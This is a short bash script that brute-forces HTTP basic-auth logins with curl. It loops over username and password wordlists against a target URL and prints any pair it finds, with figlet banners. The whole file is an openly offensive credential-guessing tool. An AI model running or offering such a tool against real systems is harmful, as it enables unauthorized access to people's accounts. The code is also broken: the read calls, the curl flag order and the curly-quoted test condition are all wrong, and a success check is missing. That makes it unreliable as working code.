#!/usr/bin/bash

clear

figlet -f slant "START CURL BRUTEFORCE" | lolcat

while read $USERNAME; do
 while read $PASSWORD; do
 cmd=$(curl -s -u -L $USERNAME:$PASSWORD $1)
  if [“cmd”]
    then
     echo “Credentials found! User:$USERNAME & Password:$PASSWORD”
  fi
 done < $3
done < $2

figlet -f slant "BRUTEFORCE TERMINATED" | lolcat
